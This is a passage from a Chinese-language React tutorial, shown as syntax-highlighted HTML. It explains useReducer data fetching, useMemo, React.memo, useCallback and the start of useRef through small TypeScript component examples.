&#123;<br>        <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-attr">post</span>: action.<span class="hljs-property">payload</span>,<br>      &#125;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_ERROR&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;something went wrong&#x27;</span>,<br>        <span class="hljs-attr">post</span>: &#123;&#125;,<br>      &#125;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DataFetchingTwo</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState)<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>) =&gt;</span> &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>,<br>        <span class="hljs-attr">payload</span>: res.<span class="hljs-property">data</span>,<br>      &#125;)<br>    &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123;<br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_ERROR&#x27;</span><br>      &#125;)<br>    &#125;)<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;</span><br><span class="language-xml">        state.loading</span><br><span class="language-xml">          ? &#x27;Loading...&#x27;</span><br><span class="language-xml">          // @ts-ignore</span><br><span class="language-xml">          : state.post.title</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">      &#123;</span><br><span class="language-xml">        state.error</span><br><span class="language-xml">          ? state.error</span><br><span class="language-xml">          : null</span><br><span class="language-xml">      &#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">DataFetchingTwo</span><br></code></pre></td></tr></table></figure><p>可以看到，我们将 state 集合在了一起，在同一个对象，修改 state 的逻辑也聚合在了一起，即 reducer 函数中的 switch 部分。</p><hr><p>useState vs useReducer</p><ul><li><p>如果 state 的类型为 Number, String, Boolean 建议使用 useState，如果 state 的类型 为 Object 或 Array，建议使用 useReducer</p></li><li><p>如果 state 变化非常多，也是建议使用 useReducer，集中管理 state 变化，便于维护</p></li><li><p>如果 state 关联变化，建议使用 useReducer</p></li><li><p>业务逻辑如果很复杂，也建议使用 useReducer</p></li><li><p>如果 state 只想用在 组件内部，建议使用 useState，如果想维护全局 state 建议使用 useReducer</p></li></ul><h5 id="5-useCallback和useMemo"><a href="#5-useCallback和useMemo" class="headerlink" title="5 useCallback和useMemo"></a>5 useCallback和useMemo</h5><blockquote><p>自定义那几个变量变化才更新，阻止了子组件不必要的render</p><p>useCallback 是缓存了函数自身，而 useMemo 是缓存了函数的返回值。</p></blockquote><p>组件多次被复用的场景</p><p>有一个组件树结构。ParentWrap 包含 Title 组件、2次使用 Count 组件、2次使用 Button 组件。</p><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/1571668332118_.pic-20221113%2020:36:13.jpg" alt="1571668332118_.pic"></p><p>App.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">ParentComponent</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/26ParentComponenet&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;App&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ParentComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span><br></code></pre></td></tr></table></figure><p>ParentComponent.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useState &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Title</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./26Title&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Count</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./26Count&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./26Button&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ParentComponenet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [age, setAge] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">29</span>)<br>  <span class="hljs-keyword">const</span> [salary, setSalary] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">50000</span>)<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">incrementAge</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setAge</span>(age + <span class="hljs-number">1</span>)<br>  &#125;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">incrementSalary</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">setSalary</span>(salary + <span class="hljs-number">1000</span>)<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Title</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Count</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">text</span>=<span class="hljs-string">&quot;Age&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;age&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">handleClick</span>=<span class="hljs-string">&#123;incrementAge&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span>Increment age<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Count</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">text</span>=<span class="hljs-string">&quot;Salary&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;salary&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Button</span></span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">handleClick</span>=<span class="hljs-string">&#123;incrementSalary&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      &gt;</span>Increment salary<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ParentComponenet</span><br></code></pre></td></tr></table></figure><p>Title.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Title</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Rendering Title&#x27;</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>useCallback<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Title</span><br></code></pre></td></tr></table></figure><p>Count.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Count</span>(<span class="hljs-params">props: &#123;</span><br><span class="hljs-params">  text: <span class="hljs-built_in">string</span></span><br><span class="hljs-params">  count: <span class="hljs-built_in">number</span></span><br><span class="hljs-params">&#125;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Rendering <span class="hljs-subst">$&#123;props.text&#125;</span>`</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;props.text&#125; - &#123;props.count&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Count</span><br></code></pre></td></tr></table></figure><p>Button.tsx</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">props: &#123;</span><br><span class="hljs-params">  handleClick: () =&gt; <span class="hljs-built_in">void</span></span><br><span class="hljs-params">  children: <span class="hljs-built_in">string</span></span><br><span class="hljs-params">&#125;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Rendering button&#x27;</span>, props.<span class="hljs-property">children</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;props.handleClick&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;props.children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">Button</span><br></code></pre></td></tr></table></figure><p>每次点击，可以看到以下日志：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">Rendering Title<br>Rendering Age<br>Rendering <span class="hljs-selector-tag">button</span> Increment age<br>Rendering Salary<br>Rendering <span class="hljs-selector-tag">button</span> Increment salary<br></code></pre></td></tr></table></figure><p>每次状态改变都触发了所有组件的 rerender，这个示例比较简单，但是假如未来遇到20、30、甚至50个组件 rerender 的时候，就一定要考虑到性能问题了。下面讲讲在这个示例中怎么进行优化。</p><hr><p>useMemo</p><p>使用：<code>const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]);</code></p><p>返回一个 memoized 值。 把“创建”函数和依赖项数组作为参数传入 <code>useMemo</code>，它仅会在某个依赖项改变时才重新计算 memoized 值。这种优化有助于避免在每次渲染时都进行高开销的计算。</p><p>记住，传入 <code>useMemo</code> 的函数会在渲染期间执行。请不要在这个函数内部执行与渲染无关的操作，诸如副作用这类的操作属于 <code>useEffect</code> 的适用范畴，而不是 <code>useMemo</code>。</p><p>如果没有提供依赖项数组，<code>useMemo</code> 在每次渲染时都会计算新的值。</p><p><strong>你可以把 useMemo 作为性能优化的手段，但不要把它当成语义上的保证。</strong> 将来，React 可能会选择“遗忘”以前的一些 memoized 值，并在下次渲染时重新计算它们，比如为离屏组件释放内存。先编写在没有 useMemo 的情况下也可以执行的代码 —— 之后再在你的代码中添加 useMemo，以达到优化性能的目的。</p><p>例：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> isEven = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-number">1000000000</span>) i += <span class="hljs-number">1</span><br>  <span class="hljs-keyword">return</span> counterOne % <span class="hljs-number">2</span> === <span class="hljs-number">0</span><br>&#125;, [counterOne])<br></code></pre></td></tr></table></figure><p>在本例中，我们当然希望点击增加年龄的按钮时，只有关于年龄的 Count 和 Button 进行 rerender，而其他组件不发生 rerender，点击增加 salary 时也一样。如何才能做到呢？答案是 <code>React.memo</code>。</p><p>我们给 Title.tsx, Count.tsx, Button.tsx 添加 <code>React.memo()</code>，代码如下：</p><p>Title.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Title</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Rendering Title&#x27;</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>useCallback<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">Title</span>)<br></code></pre></td></tr></table></figure><p>Count.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Count</span>(<span class="hljs-params">props: &#123;</span><br><span class="hljs-params">  text: string</span><br><span class="hljs-params">  count: number</span><br><span class="hljs-params">&#125;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Rendering <span class="hljs-subst">$&#123;props.text&#125;</span>`</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;props.text&#125; - &#123;props.count&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">Count</span>)<br></code></pre></td></tr></table></figure><p>Button.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">props: &#123;</span><br><span class="hljs-params">  handleClick: () =&gt; <span class="hljs-keyword">void</span></span><br><span class="hljs-params">  children: string</span><br><span class="hljs-params">&#125;</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Rendering button&#x27;</span>, props.<span class="hljs-property">children</span>)<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;props.handleClick&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;props.children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">Button</span>)<br></code></pre></td></tr></table></figure><p>React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MyComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* 使用 props 渲染 */</span><br>&#125;);<br></code></pre></td></tr></table></figure><p>如果你的函数组件在给定相同 props 的情况下渲染相同的结果，那么你可以通过将其包装在 React.memo 中调用，以此通过记忆组件渲染结果的方式来提高组件的性能表现。这意味着在这种情况下，React 将跳过渲染组件的操作并直接复用最近一次渲染的结果。</p><p>React.memo 仅检查 props 变更。如果函数组件被 React.memo 包裹，且其实现中拥有 useState 或 useContext 的 Hook，当 context 发生变化时，它仍会重新渲染。</p><p>默认情况下其只会对复杂对象做浅层对比，如果你想要控制对比过程，那么请将自定义的比较函数通过第二个参数传入来实现。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-comment">/* 使用 props 渲染 */</span><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">areEqual</span>(<span class="hljs-params">prevProps, nextProps</span>) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  如果把 nextProps 传入 render 方法的返回结果与</span><br><span class="hljs-comment">  将 prevProps 传入 render 方法的返回结果一致则返回 true，</span><br><span class="hljs-comment">  否则返回 false</span><br><span class="hljs-comment">  */</span><br>&#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-title class_">MyComponent</span>, areEqual);<br></code></pre></td></tr></table></figure><p>此方法仅作为性能优化的方式而存在。但请不要依赖它来“阻止”渲染，因为这会产生 bug。</p><p>但是，使用了 React.memo 后，依然有不相关的 rerender：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">Rendering Age<br>Rendering <span class="hljs-selector-tag">button</span> Increment age<br>Rendering <span class="hljs-selector-tag">button</span> Increment salary<br></code></pre></td></tr></table></figure><p>在 ParentComponenet.tsx 中，我们看到点击 Increment age 按钮时，导致了 state 变化，ParentComponenet 进行了 rerender。<code>&lt;Title /&gt;</code> 没有传入属性，React.memo 判断出不需要 rerender，但是 Increment salary 按钮上的属性 incrementSalary 方法，实际上被重新创建了，导致了这个 Button 传入的 props 发生了变化，因此 React.memo 没有阻止 rerender。点击按钮 Increment salary 导致的相同的现象也是同理。那么如何解决呢？答案是使用 useCallback hook。</p><hr><p>useCallback</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> memoizedCallback = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">doSomething</span>(a, b);<br>  &#125;,<br>  [a, b],<br>);<br></code></pre></td></tr></table></figure><p>返回一个 memoized 回调函数。</p><p>把内联回调函数及依赖项数组作为参数传入 <code>useCallback</code>，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。</p><p>类比到我们的例子中，useCallback 会缓存我们的 <code>incrementSalary()</code> 如果 salary 没有变化，直接返回缓存的值，如果 salary 发生变化，也就是 useCallback 的依赖发生变化，那么一个新的方法将被返回。这就可以帮助我们解决只依赖某个变量的子组件避免不必要的 render 问题。</p><p>如何使用：</p><ol><li>import useCallback</li><li>调用useCallback</li></ol><p>我们将 ParentComponenet.tsx 中的 incrementAge 和 incrementSalary 使用 useCallback 改写如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">const</span> incrementAge = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setAge</span>(age + <span class="hljs-number">1</span>)<br>  &#125;,<br>  [age],<br>)<br><br><span class="hljs-keyword">const</span> incrementSalary = <span class="hljs-title function_">useCallback</span>(<br>  <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">setSalary</span>(salary + <span class="hljs-number">1000</span>)<br>  &#125;,<br>  [salary],<br>)<br></code></pre></td></tr></table></figure><h5 id="6-useRef"><a href="#6-useRef" class="headerlink" title="6 useRef"></a>6 useRef</h5><p>页面载入获取焦点示例</p><p>FocusInput.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, &#123; useEffect, useRef&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">FocusInput</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> inputRef = useRef&lt;<span class="hljs-title class_">HTMLInputElement</span>&gt;(<span class="hljs-literal">null</span>)<br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    inputRef.<span class="hljs-property">current</span> &amp;&amp; inputRef.<span class="hljs-property">current</span>.<span class="hljs-title function_">focus</span>()<br>  &#125;, [])<br><br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;inputRef&#125;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">FocusInput</span><br></code></pre></td></tr></table></figure><p>App.tsx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&#x27;./App.css&#x27;</span><br><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">FocusInput</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/28FocusInput&#x27;</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span 